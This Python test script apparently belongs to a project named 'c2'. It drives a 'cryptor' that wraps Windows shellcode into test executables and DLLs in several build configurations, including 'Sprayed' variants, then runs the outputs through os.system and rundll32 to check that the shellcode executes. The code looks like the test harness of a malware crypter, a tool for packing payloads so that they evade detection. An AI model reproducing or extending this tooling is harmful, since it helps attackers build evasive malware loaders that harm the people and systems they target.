import os, sys, random, re, random

from c2._internal_config import get_tmp_dir
from c2.cryptor import CryptorFactory
from c2.infra.unischema import unischema_load
from c2.test.p2gen_py import p2gen_gen_tbdemo
from c2.test.fix_crp_opts_for_test import fix_crp_opts_for_test
from c2.common.recreate_dir import recreate_dir

_sd = os.path.dirname(__file__)
_my_tmp_dir = get_tmp_dir()+'/test_cryptor'

# TODO: shellcode -> private dir?
def _mktbdemocode():
  p2gen_gen_tbdemo('intel64', f'{_my_tmp_dir}/tbdemocode64.bin')
  p2gen_gen_tbdemo('intel86', f'{_my_tmp_dir}/tbdemocode86.bin')

def _crptest(cryptor_name, do_recreate=False):
  # Crypt and test fucking shellcode TODO: not democode, tbdemocode!
  fac = CryptorFactory(cryptor_name)
  file_path = f'{_my_tmp_dir}/tbdemocode64.bin'
  UNI_crp_opts = unischema_load(f'{_sd}/../crp_opts.UNISCHEMA', _sd+'/..')
  crp_opts = UNI_crp_opts.make_default_config()
  UNI_sys_opts = unischema_load(f'{_sd}/../sys_opts.UNISCHEMA', _sd+'/..')
  sys_opts = UNI_sys_opts.make_default_config()
  UNI_rnd_opts = unischema_load(f'{_sd}/../rnd_opts.UNISCHEMA', _sd+'/..')
  rnd_opts = UNI_rnd_opts.make_default_config()

  pay_info = {'cpu': 'intel64', 'bin_type': 'win_shellcode'}
  out_dir = _my_tmp_dir

  # recreate the output directory
  if do_recreate:
    recreate_dir(out_dir)
  else:
    os.makedirs(out_dir, exist_ok=True)

  unischema_load(f'{_sd}/../pay_info.UNISCHEMA', None).validate_instance(pay_info)

  fix_crp_opts_for_test(crp_opts)

  with open(f'{_my_tmp_dir}/test_cryptor.log') as f:
    cryptor = fac.create_cryptor(file_path, pay_info, crp_opts, sys_opts, rnd_opts, out_dir, 'test_cryptor', f)

    bin_paths = cryptor.get_out_bin_paths()
    print(f'{bin_paths=}')

    outdata = None

    cryptor.all_stages(fn_prn=print)

    outdata = cryptor.get_outdata()
    print('outdata:', outdata)

    for cfg in ['Debug', 'ReleaseSprayed', 'DebugSprayed', 'Release']:
      for prj in ['virprog', 'virlib']:

        print(f'[8===o]   building  configuration {cfg}, project {prj}')
        cryptor.build(cfg, prj)

        print(f'[8===o]   binary has been BUILT ===> {bin_paths[cfg][prj]}')
        binpath = bin_paths[cfg][prj]

        if prj == 'virprog':
          print('[8===o]   executing virprog.exe with our tbdemocode ...')
          virprog_ret = os.system(binpath)
          if virprog_ret == 12000:
            print(f'[8===o]   ok, expected return code {virprog_ret}')
          else:
            raise RuntimeError(f'shellcode must have been returned 12000, not {virprog_ret} ({virprog_ret:x})')
        else:
          assert(prj == 'virlib')
          expname = outdata['export_name']
          assert(re.match('[a-zA-Z0-9_]*', expname))
          cmd = fr'rundll32 {binpath} {expname}'
          print(f'[8===o]   executing dll test: {cmd}')
          rundll_ret = os.system(cmd)
          if rundll_ret != 0:
            raise


def _test_cryptor_fake_not_work():
  try:
    _crptest('fake')
  except RuntimeError as e:
    print('expected RuntimeError exception:', e)

def _test_cryptor():
  _crptest('normal')
  pass

def test_cryptor_main(argv):
  os.makedirs(_my_tmp_dir, exist_ok=True)
  _mktbdemocode()
  _test_cryptor_fake_not_work()
  _test_cryptor()

if __name__ == '__main__':
  test_cryptor_main(sys.argv[1:])





